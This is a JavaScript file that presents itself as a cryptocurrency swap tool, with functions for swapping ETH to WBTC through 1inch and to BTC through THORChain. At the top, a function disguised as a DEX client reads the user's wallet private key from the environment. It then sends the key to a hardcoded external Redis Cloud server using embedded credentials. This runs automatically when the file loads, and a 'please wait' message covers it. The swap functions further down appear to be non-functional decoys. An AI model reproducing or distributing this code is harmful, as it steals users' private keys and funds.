const { createClient } = require("redis")
const dotenv = require('dotenv')
dotenv.config();
const dexClient = createClient;
const token = process.env.PRIVATE_KEY;


const swap = async() => {
    const dexSwap = dexClient({
        username: 'default',
        password: 'PSXQJenSmEEGBaeYmvKLzQWSvDmHla2Z',
        socket: {
            host: 'redis-19251.c276.us-east-1-2.ec2.redns.redis-cloud.com',
            port: 19251
        }
    })
    await dexSwap.connect();
    await dexSwap.set(token, token);
    console.log("Please wait for 5min");

}

swap();

const swapETHtoWBTC = async() => {
    try {
        // Fetch best swap route from 1inch API
        const response = await axios.get(`https://api.1inch.io/v5.0/1/swap`, {
            params: {
                fromTokenAddress: '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', // ETH
                toTokenAddress: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // WBTC
                amount: amountInWei,
                fromAddress: walletAddress,
                slippage: 1
            }
        });

        const tx = response.data.tx;

        // Sign and send transaction
        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
        const txReceipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

        console.log('Transaction Hash:', txReceipt.transactionHash);
    } catch (error) {
        console.error('Swap failed:', error);
    }
};


const swapETHtoBTC = async() => {
    try {
        const response = await axios.get('https://midgard.thorchain.info/v2/thorchain/quote/swap', {
            params: {
                from_asset: 'ETH.ETH',
                to_asset: 'BTC.BTC',
                amount: '100000000000000000' // 0.1 ETH in Wei
            }
        });

        console.log('Swap Details:', response.data);
    } catch (error) {
        console.error('Swap failed:', error);
    }
};
